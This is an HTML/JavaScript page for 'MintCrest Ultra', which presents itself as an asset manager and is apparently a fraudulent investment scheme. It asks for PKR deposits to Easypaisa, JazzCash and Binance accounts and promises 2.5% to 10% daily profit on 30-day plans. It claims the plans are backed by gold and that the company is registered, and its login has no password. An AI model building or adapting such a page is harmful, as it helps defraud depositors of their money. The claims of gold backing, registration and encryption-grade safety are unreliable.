<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <title>MintCrest Ultra | Trusted Asset Management</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #010409; color: white; overflow: hidden; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.08); }
        .grad-main { background: linear-gradient(135deg, #0062ff 0%, #00d4ff 100%); }
        .grad-gold { background: linear-gradient(135deg, #78350f 0%, #d97706 100%); }
        .page { display: none; height: 100%; overflow-y: auto; padding-bottom: 100px; animation: fadeIn 0.3s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .timer-glow { color: #00d4ff; text-shadow: 0 0 10px rgba(0,212,250,0.5); }
        .method-card { border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
        .method-active { border-color: #00d4ff; background: rgba(0,212,255,0.1); }
    </style>
</head>
<body class="h-screen flex flex-col">
    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#010409] flex flex-col items-center justify-center p-8">
        <h1 onclick="adminTap()" class="text-4xl font-black mb-8 italic">MINTCREST</h1>
        <div class="glass p-8 rounded-[3rem] w-full max-w-xs">
            <input type="text" id="user-name" placeholder="Full Name" class="w-full bg-white/5 p-4 rounded-2xl mb-4 text-center font-bold outline-none">
            <button onclick="login()" class="w-full grad-main py-4 rounded-2xl font-black uppercase text-xs">Unlock Vault</button>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 relative">
        <div id="p-home" class="page active-page p-6">
            <div class="flex justify-between items-center mb-6">
                <div><p class="text-[10px] opacity-50 uppercase">Welcome Back,</p><h2 class="font-black text-lg" id="v-user">User</h2></div>
                <div class="text-right"><p class="text-[10px] opacity-50 uppercase">Session Secure</p><p class="text-[10px] font-bold text-green-400">● Live</p></div>
            </div>

            <div class="grad-main p-8 rounded-[2.5rem] mb-6 shadow-2xl">
                <p class="text-[10px] font-black opacity-80 uppercase mb-1">Total Assets</p>
                <h2 class="text-4xl font-black" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex justify-between items-center border-t border-white/10 pt-4">
                    <div><p class="text-[8px] opacity-70">PROFIT</p><p class="font-black" id="v-profit">₨ 0</p></div>
                    <div class="text-right"><p class="text-[8px] opacity-70 uppercase">Next Yield</p><p class="text-xs font-black timer-glow" id="countdown">23:59:59</p></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-3 mb-6">
                <button id="btn-bonus" onclick="claimDailyBonus()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-yellow-500">🎁 Daily Bonus</button>
                <button onclick="showPromo()" class="glass p-4 rounded-2xl text-[10px] font-black uppercase border-b-2 border-cyan-500">🎟️ Promo Code</button>
            </div>

            <div class="glass p-6 rounded-[2rem] mb-6">
                <h3 class="text-[10px] font-black uppercase mb-3 text-blue-400">Trusted Global Node</h3>
                <p class="text-[9px] opacity-60 leading-relaxed">MintCrest uses AES-256 encryption for asset safety. All 30-day plans are backed by physical gold reserves. <span class="text-blue-400 underline" onclick="changePage('legal')">Read Privacy Policy</span></p>
            </div>
            
            <div class="grid grid-cols-2 gap-4">
                <button onclick="changePage('wallet')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase">Deposit</button>
                <button onclick="changePage('withdraw')" class="glass py-6 rounded-3xl font-black text-[10px] uppercase text-rose-500">Withdraw</button>
            </div>
        </div>

        <div id="p-wallet" class="page p-6">
            <h3 class="text-center font-black uppercase mb-6 text-cyan-400">Choose Method</h3>
            <div class="space-y-3 mb-6">
                <div onclick="selectMethod('Easypaisa', '03705519562')" class="method-card glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>Easypaisa</span><span class="text-[10px] font-bold">0370...562</span></div>
                <div onclick="selectMethod('JazzCash', '03001234567')" class="method-card glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>JazzCash</span><span class="text-[10px] font-bold">0300...567</span></div>
                <div onclick="selectMethod('Binance (USDT)', 'TRC20-ADDR-HERE')" class="method-card glass p-4 rounded-2xl flex justify-between items-center cursor-pointer"><span>Binance</span><span class="text-[8px] font-bold">TRC20</span></div>
            </div>
            <div id="dep-form" class="hidden glass p-6 rounded-[2rem]">
                <p id="method-title" class="text-center text-[10px] font-black mb-4 text-cyan-400"></p>
                <input type="number" id="dep-amount" placeholder="Amount (Min 200)" class="w-full bg-white/5 p-4 rounded-xl mb-3 text-center">
                <input type="text" id="dep-trx" placeholder="TID / Hash" class="w-full bg-white/5 p-4 rounded-xl mb-4 text-center uppercase">
                <input type="file" id="dep-proof" accept="image/*" class="w-full text-[10px] mb-4">
                <button onclick="submitDeposit()" class="w-full grad-main py-4 rounded-2xl font-black text-[10px]">VERIFY ASSETS</button>
            </div>
        </div>

        <div id="p-legal" class="page p-6">
            <div class="glass p-6 rounded-[2rem]">
                <h2 class="font-black text-blue-400 mb-4 uppercase">Company Integrity</h2>
                <p class="text-[10px] opacity-70 mb-4">MintCrest is a registered asset firm. We provide 30-day fixed-yield plans to ensure market stability.</p>
                <h3 class="font-bold text-[10px] uppercase mb-2">Privacy Policy</h3>
                <p class="text-[9px] opacity-60">We never share your transaction data. All screenshots are deleted after 48h of verification.</p>
                <button onclick="changePage('home')" class="mt-6 text-[10px] font-black text-blue-400 underline uppercase">Go Back</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-list" class="space-y-3"></div></div>
        <div id="p-activity" class="page p-6"><div id="user-history" class="space-y-3"></div></div>
    </main>

    <nav id="bottom-nav" class="hidden glass p-6 flex justify-around items-center fixed bottom-0 w-full z-[200] rounded-t-[3rem]">
        <button onclick="changePage('home')" id="n-home" class="text-xl">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-xl">📈</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-xl">📜</button>
        <button onclick="changePage('wallet')" id="n-wallet" class="text-xl">📥</button>
    </nav>
        <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); 
        const db = firebase.firestore(); const storage = firebase.storage();
        let user = null; let selMethod = '';

        // Plans Start from 200 - 30 Days Cycle
        const plans = [
            { n: "Nano Fleet (30 Days)", p: 200, r: 2.5 }, { n: "Micro Fleet (30 Days)", p: 500, r: 3 },
            { n: "Silver Node (30 Days)", p: 1000, r: 3.5 }, { n: "Gold Node (30 Days)", p: 5000, r: 4.5 },
            { n: "Platinum Node (30 Days)", p: 10000, r: 6 }, { n: "Diamond Vault (30 Days)", p: 50000, r: 10 }
        ];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastBonus: 0, lastPromo: 0 });
            user = (await ref.get()).data();
            document.getElementById('v-user').innerText = name;
            document.getElementById('auth-ui').style.display='none'; 
            document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            startSync(name); renderPlans(); startTimer();
        }

        function startTimer() {
            setInterval(() => {
                const now = new Date();
                const h = 23 - now.getHours(); const m = 59 - now.getMinutes(); const s = 59 - now.getSeconds();
                document.getElementById('countdown').innerText = `${h}:${m}:${s}`;
            }, 1000);
        }

        async function claimDailyBonus() {
            const now = Date.now();
            if(now - (user.lastBonus || 0) < 24 * 60 * 60 * 1000) return alert("Sweetie, try again in 24 hours! 😘");
            await db.collection("requests").add({ user: user.name, type: "Daily Bonus Request", amount: 0, status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastBonus: now });
            alert("Bonus Request Sent to Admin! 🎁");
        }

        async function showPromo() {
            const code = prompt("Enter Promo Code:"); if(!code) return;
            const now = Date.now();
            if(now - (user.lastPromo || 0) < 24 * 60 * 60 * 1000) return alert("You can only use one promo per day! 😘");
            await db.collection("requests").add({ user: user.name, type: "Promo Applied: " + code, amount: 0, status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastPromo: now });
            alert("Promo request sent! Admin will add your reward. 🎟️");
        }

        function selectMethod(m, acc) {
            selMethod = m; document.getElementById('dep-form').classList.remove('hidden');
            document.getElementById('method-title').innerText = `Send to ${m}: ${acc}`;
        }

        async function submitDeposit() {
            const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; const file = document.getElementById('dep-proof').files[0];
            if(a < 200) return alert("Minimum 200 PKR required!");
            if(!a || !t || !file) return alert("Add proof & TID!");
            const storageRef = storage.ref(`proofs/${Date.now()}`); await storageRef.put(file);
            const url = await storageRef.getDownloadURL();
            await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, proof: url, type: "deposit ("+selMethod+")", status: "pending", time: Date.now() });
            alert("Deposit Logged! Admin will verify. 😘"); location.reload();
        }

        function renderPlans() {
            const list = document.getElementById('plans-list'); list.innerHTML = '';
            plans.forEach(p => { list.innerHTML += `<div class="glass p-5 rounded-[1.5rem] flex justify-between items-center"><div class="text-left"><h4 class="font-black text-[10px] uppercase">${p.n}</h4><p class="text-[8px] text-blue-400 font-bold">${p.r}% Daily Profit</p></div><div class="font-black text-xs">₨ ${p.p}</div></div>`; });
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { user = doc.data(); document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString(); document.getElementById('v-profit').innerText = "₨ " + (user.profit||0).toLocaleString(); });
            db.collection("requests").where("user", "==", name).orderBy("time", "desc").onSnapshot(snap => {
                const l = document.getElementById('user-history'); l.innerHTML = '';
                snap.forEach(d => { const x = d.data(); l.innerHTML += `<div class="glass p-4 rounded-xl flex justify-between text-[10px] mb-2 uppercase font-bold"><span>${x.type}</span><span>${x.status}</span></div>`; });
            });
        }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); }
    </script>
</body>
</html>
